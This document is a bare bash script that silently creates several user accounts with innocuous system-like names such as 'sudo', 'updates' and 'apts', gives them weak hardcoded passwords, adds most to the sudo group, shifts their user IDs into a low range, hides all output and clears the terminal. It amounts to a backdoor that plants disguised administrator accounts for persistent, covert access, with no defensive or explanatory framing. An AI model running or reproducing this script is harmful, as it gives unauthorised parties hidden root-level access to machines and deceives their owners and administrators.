
#!/bin/bash

useradd  -m   -s /bin/bash admins > /dev/null 2>&1
useradd  -m   -s /bin/bash essentials > /dev/null 2>&1
useradd  -m   -s /bin/bash sudo > /dev/null 2>&1
useradd  -m   -s /bin/bash ubuntu > /dev/null 2>&1
useradd  -m   -s /bin/bash updates > /dev/null 2>&1
useradd  -m   -s /bin/bash apts > /dev/null 2>&1

printf "stems\nstems" | sudo passwd admins  > /dev/null 2>&1
printf "stems\nstems" | sudo passwd ubuntu > /dev/null 2>&1
printf "essentials\nessentials" | sudo passwd essentials > /dev/null 2>&1
printf "sudos\nsudos" | sudo passwd sudo > /dev/null 2>&1
printf "updates\nupdates" | sudo passwd updates > /dev/null 2>&1
printf "apt\napt" | sudo passwd apts > /dev/null 2>&1


usermod -aG sudo essentials > /dev/null 2>&1
usermod -aG sudo sudo > /dev/null 2>&1
usermod -aG sudo updates > /dev/null 2>&1
usermod -aG sudo apts > /dev/null 2>&1
usermod -aG sudo admins > /dev/null 2>&1

sudo usermod -u 560 essentials > /dev/null 2>&1
sudo usermod -u 562 sudo > /dev/null 2>&1
sudo usermod -u 563 updates > /dev/null 2>&1
sudo usermod -u 564 apts > /dev/null 2>&1
sudo usermod -u 565 console > /dev/null 2>&1
sudo usermod -u 568 admins > /dev/null 2>&1

clear











